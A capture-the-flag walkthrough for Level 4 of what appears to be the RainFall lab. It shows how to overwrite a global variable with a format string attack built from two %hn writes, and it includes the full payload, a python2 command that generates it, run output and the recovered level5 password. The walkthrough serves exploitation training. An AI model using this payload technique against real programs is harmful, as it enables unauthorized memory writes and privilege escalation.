# Walkthrough for Level 4

## Understanding the Binary

The binary is vulnerable to a format string attack because it passes user input directly to `printf` as a format string
instead of as a plain text string. As in the previous level, this allows us to write to arbitrary memory locations. On
the other hand, we see that if the value of the global variable `m` is 0x1025544, the contents of the `.pass` file will
be shown. Therefore, we are going to use a format string attack to overwrite the value of `m` with 0x1025544 and then
read the `.pass` file.

## Getting the address of the global variable `m`

We use `nm` to find the address of the global variable `m` in the `level4` binary. The address is `0x08049810`.

```shell
└─$ nm ./level4 | grep "B m"
08049810 B m
```

## The format parameter `%hn`

We could use the `%n` format specifier as in the previous level to set the value of `m`. However, since we need to write
16,930,116 (0x1025544 in decimal) characters to set the correct value for `m` and `fgets` only reads a maximum of 512
characters, we need to use a trick. Instead of writing a long integer (4 bytes), we’ll write two short integers (2 bytes
each). To do that, we’ll use another specifier: `%hn`.

We want to write 0x01025544. This means 0x0102 (258 in decimal) in the high-order bytes and 0x5544 (21828 in decimal)
in the low-order bytes.

We want to write these values at address 0x08049810: 0x5544 (the lower two bytes) at 0x08049810, and 0x0102 (the higher
two bytes) at 0x08049812 (which is 0x08049810 + 2).

Converted to little-endian, the two addresses become `\x10\x98\x04\x08\x12\x98\x04\x08`.

## Determining the Position of our argument on the Stack

To find the position of our argument on the stack, we can run the binary with a format string that prints several values
from the stack.

```shell
level4@RainFall ~ $ ./level4 
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 
AAAA.0xf7ed92f0.0xfff47910.0xf7e9ae14.0x80484c0.0xf7efdb60.0xfff478d8.0x804848d.0xfff476d0.0x200.0xf7e9b5c0.0x1000000.0x41414141.0x2e70252e
```

We can see that the 12th argument on the stack is 0x41414141 (which corresponds to AAAA in hexadecimal), so we will use
12 as our starting positional parameter `%12$n`. Based on the previous step, we need two positional parameters: `%12$hn`
for the lower-order bytes and `%13$hn` for the higher-order bytes.

## Padding the format string

`AAAA%96x%12$n` will write the value 100 at the address 0x41414141. The `%96x` specifier will pad the output with 96
characters, resulting in a total of 100 characters printed (four from AAAA and 96 from the padding).

## Crafting the Exploit

The resulting exploit is: `\x10\x98\x04\x08\x12\x98\x04\x08%250x%13$hn%21570x%12$hn`.

- \x10\x98\x04\x08 or 0x08049810 (in reverse order) points to the high order bytes.
- \x12\x98\x04\x08 or 0x08049812 (in reverse order) points to the low order bytes.
- %250x will write 250 bytes on the standard output.
- %13$hn will write 8 + 250 = 258 bytes (or 0x0102) at the first address specified (0x08049810).
- %21570x will write 21570 bytes on the standard output.
- %12$hn will write 8 + 250 + 21570 = 21828 (or 0x5544) at the second address specified (0x08049812).

We use Python to generate the exploit and save it to a file:
```shell
python2 -c 'print "\x10\x98\x04\x08\x12\x98\x04\x08%250x%13$hn%21570x%12$hn"' > /tmp/exploit4
```

## Running the Exploit and Getting the Password

```shell
level4@RainFall:~$ ./level4 < /tmp/exploit4
# ...SNIP...                                                                                                                                                                                                                                                  b7ff26b0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          bffff774
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

We can now log in via SSH as the `level5` user using the password we just found.
